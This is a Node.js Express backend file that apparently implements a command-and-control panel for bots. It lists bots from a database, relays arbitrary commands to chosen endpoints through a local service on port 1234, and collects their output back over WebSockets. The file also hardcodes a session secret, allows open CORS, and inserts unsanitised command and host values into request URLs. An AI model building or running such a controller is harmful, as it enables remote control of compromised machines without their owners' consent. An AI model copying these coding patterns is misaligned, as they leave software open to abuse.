const express = require('express');
const fs = require('fs');
const https = require('https');
const http = require('http');
const fetch = require('node-fetch');
const ws = require('ws');
const db = require('../database/config.js');
const collections = ['client', 'comanda', 'user'];
var bodyParser = require('body-parser')
var jsonParser = bodyParser.json()
var urlencodedParser = bodyParser.urlencoded({ extended: false })
const path = require('path');
const cors = require('cors');
const {parseBinary} = require('./helpers/parseBinary');
const passport = require('passport');
const session = require('express-session');


// PASSPORT Initialization
    require('../passport/local-auth');

function startBackend(){
    const app = express();
    const port = 5000;
    const public = express.static('public');
    const options = {
        key: fs.readFileSync('./certs/server.key'),
        cert: fs.readFileSync('./certs/server.crt'),
    };
    const server = https.createServer(options, app);
    const wss = new ws.Server( {port: 8081} );
    wss.on('connection', (ws) => {
        /* Send test message to check if conn has been established
            with frontend or not
        */
        
        //connection is up, let's add a simple simple event
        ws.on('message', (message) => {
            messageArgs = message.split(' ')

            if(messageArgs[0] == "GET"){
                if(messageArgs[1] == "botList"){
                    console.log("Sending bot list to Frontend")
                    // Executar query a la database i retornar dades
                    db.connect ( (err) => {
                        if(err) {
                            console.log(err);
                        } else {
                            
                            var client = db.getColl(collections[0]);
                            db.getDocuments(client, {}).then( (doc, err) => {
                                const binaryRes = parseBinary("botlist: " + JSON.stringify(doc));
                                ws.send(binaryRes)
                            });
                        }

                    });
                }
            }


            //log the received message and send it back to the client

            console.log('Frontend says: %s', message);
        });    

    });

    // Middlewares
    app.use(cors());
    app.use(express.static(path.join(__dirname + '/../../public')));
    app.use(session({
        secret: 'mysecretsession',
        resave: false,
        saveUninitialized: false
    }));
    app.use(passport.initialize());
    app.use(passport.session());

    app.get('/consolelog', (req, res)=>{
        console.log("Esto se ejecuta en la consola del servidor");
    });
    app.post('/outputback', jsonParser, (req, res)=>{//comando=req.body.cmd, output=req.body.output, endpoint=req.body.endp
        console.log(`rebut:\ncomando:${req.body.cmd}\n${req.body.output}endpoint:${req.body.endp}`);
        wss.clients.forEach( async (client) => {
            if (client.readyState === ws.OPEN) {
                const strJson = await JSON.stringify({ endp : req.body.endp, command : req.body.cmd, output : req.body.output  });
                const binaryJson = await parseBinary(strJson);
                await client.send(binaryJson);
            }
          });
    });
    app.get('/command=:cmd/endp=:hosts', async (req, res)=>{
        let resdata = await fetch(`http://localhost:1234/command=${req.params.cmd}_._/endp=${req.params.hosts}`).then(res =>{
            return res.text()
        }).then(body =>{
            console.log("Console log dintre del fetch: ",body)
            return body
        });
        console.log("Console log fora del fetch:", resdata)
        res.send(resdata)
    });
    app.post('/sendcommands', jsonParser, async (req, res) =>{
        let command = req.body.cmd
        let endpoints = req.body.endp
        console.log("CMD: ", command, "\nENDP: ", endpoints)
        let resdata = await fetch(`http://localhost:1234/command=${command}_._/endp=${endpoints}`).then(res =>{
            return res.text()
        }).then(body =>{
            console.log("Console log dintre del fetch: ",body)
            return body
        });
        console.log("Console log fora del fetch:", resdata)
        res.send(resdata)
    })
    // Login
    app.post('/signin', passport.authenticate('local-signin'));

    app.get('*', (req,res) =>{
        res.sendFile(path.join(__dirname+'/../../public/index.html'));
    });
    server.listen(port, () => {
        console.log(`Server started on port ${server.address().port} :)`);
    });
};
exports.startBackend = startBackend;